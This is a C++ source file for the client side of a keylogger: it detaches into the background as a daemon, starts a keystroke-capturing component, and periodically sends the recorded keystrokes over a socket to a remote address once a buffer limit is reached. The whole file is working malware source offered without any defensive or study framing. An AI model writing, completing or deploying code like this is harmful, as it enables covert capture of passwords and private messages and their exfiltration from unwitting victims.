#include "client.hpp"
#include "daemon.hpp"
#include <iostream>
#include <exception>

Client::Client(const std::string& address, int port, size_t buffer_limit)
    : address_(address)
    , port_(port)
    , buffer_limit_(buffer_limit)
    , running_(false)
{}

Client::~Client() {
    stop();
}

bool Client::start() {
    if (!daemonize("keylogger_client.log")) {
        std::cerr << "Failed to daemonize client" << std::endl;
        return false;
    }
    try {
        socket_.connect(address_, static_cast<uint16_t>(port_));
    } catch (const std::exception& e) {
        std::cerr << "Connection error: " << e.what() << std::endl;
        return false;
    }
    keylogger_.start();
    running_ = true;
    thread_ = std::thread(&Client::run, this);

    return true;
}

void Client::stop() {
    running_ = false;
    keylogger_.stop();
    socket_.close();
    if (thread_.joinable()) {
        thread_.join();
    }
}

void Client::run() {
    using namespace std::chrono_literals;
    auto interval = SEND_INTERVAL;

    while (running_) {
        std::this_thread::sleep_for(interval);
        if (keylogger_.buffer_size() >= buffer_limit_) {
            send_data();
        }
    }
    send_data();
}

void Client::send_data() {
    std::string data = keylogger_.flush_buffer();
    if (!data.empty()) {
        try {
            socket_.send(data.data(), data.size());
            std::cerr << "Sent " << data.size() << " bytes of data" << std::endl;
        } catch (const std::exception& e) {
            std::cerr << "Send error: " << e.what() << std::endl;
        }
    }
}
